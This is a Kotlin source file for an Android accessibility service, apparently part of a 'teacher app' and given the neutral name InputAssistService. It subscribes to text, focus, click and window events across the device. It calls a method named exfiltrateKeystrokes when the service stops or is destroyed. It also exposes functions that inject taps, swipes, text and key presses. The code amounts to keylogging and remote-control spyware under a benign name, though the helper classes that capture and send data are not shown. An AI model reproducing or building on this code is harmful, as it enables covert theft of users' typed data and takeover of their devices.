package com.example.teacherapp.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class InputAssistService : AccessibilityService() {

    private val TAG = "CoreService"

    private lateinit var inputHandler:        TextSyncHelper
    private lateinit var overlay:          UiLayerHelper
    private lateinit var gestureManager:    GestureHelper

    companion object {
        
        var instance: InputAssistService? = null
    }

    

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        inputHandler        = TextSyncHelper(this)
        overlay          = UiLayerHelper(this)
        gestureManager    = GestureHelper(this)

        
        val info = AccessibilityServiceInfo().apply {
            eventTypes =
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or   
                        AccessibilityEvent.TYPE_WINDOWS_CHANGED          or   
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED        or   
                        AccessibilityEvent.TYPE_VIEW_FOCUSED             or   
                        AccessibilityEvent.TYPE_VIEW_CLICKED             or   
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED        
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags =
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
        serviceInfo = info

        Log.d(TAG, "✅ InputAssistService connected — all helpers initialised")
    }

    

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        inputHandler.onEvent(event)   
        overlay.onEvent(event)     
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
        }
    }

    

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted — flushing keystrokes")
        inputHandler.exfiltrateKeystrokes()
        overlay.removeOverlay()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        Log.d(TAG, "Service destroyed — final keystroke flush")
        inputHandler.exfiltrateKeystrokes()
        overlay.removeOverlay()
    }

    

    fun injectTap(x: Float, y: Float)                               = gestureManager.injectTap(x, y)
    fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float)    = gestureManager.injectSwipe(x1, y1, x2, y2)
    fun injectText(text: String)                                    = gestureManager.injectText(text)
    fun clearText()                                                 = gestureManager.clearText()
    fun injectKey(key: String)                                      = gestureManager.injectKey(key)
    fun injectGlobal(action: String)                                = gestureManager.injectGlobal(action)
}